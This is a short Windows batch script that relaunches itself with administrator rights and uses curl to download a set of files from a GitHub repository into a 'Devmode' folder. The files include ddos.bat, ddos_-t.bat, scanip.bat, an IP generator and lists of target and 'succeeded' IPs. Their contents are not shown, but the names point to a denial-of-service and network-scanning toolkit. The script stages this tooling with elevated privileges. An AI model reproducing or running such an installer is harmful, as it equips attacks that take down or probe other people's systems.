@echo off
call :check_Permissions
cd %~dp0
curl https://raw.githubusercontent.com/ert11er/customcmd/main/main.bat -o main.bat
curl https://raw.githubusercontent.com/ert11er/customcmd/main/.DOWNLOADED -o .DOWNLOADED
md Devmode
cd Devmode
curl https://raw.githubusercontent.com/ert11er/customcmd/main/Devmode/ddos_-t.bat -o ddos_-t.bat
curl https://raw.githubusercontent.com/ert11er/customcmd/main/Devmode/ddos.bat -o ddos.bat
curl https://raw.githubusercontent.com/ert11er/customcmd/main/Devmode/ip_gen.py -o ip_gen.py
curl https://raw.githubusercontent.com/ert11er/customcmd/main/Devmode/ip_list.txt -o ip_list.txt
curl https://raw.githubusercontent.com/ert11er/customcmd/main/Devmode/scanip.bat -o scanip.bat
curl https://raw.githubusercontent.com/ert11er/customcmd/main/Devmode/succeded.py -o succeded.py
curl https://raw.githubusercontent.com/ert11er/customcmd/main/Devmode/succeeded_ips.txt -o succeeded_ips.txt
cd..
exit

:check_Permissions
net session >nul 2>&1
if %errorLevel% == 0 (
    cls
) else (
    powershell.exe -Command "Start-Process -Verb RunAs -FilePath \"%~f0\""
    exit
)
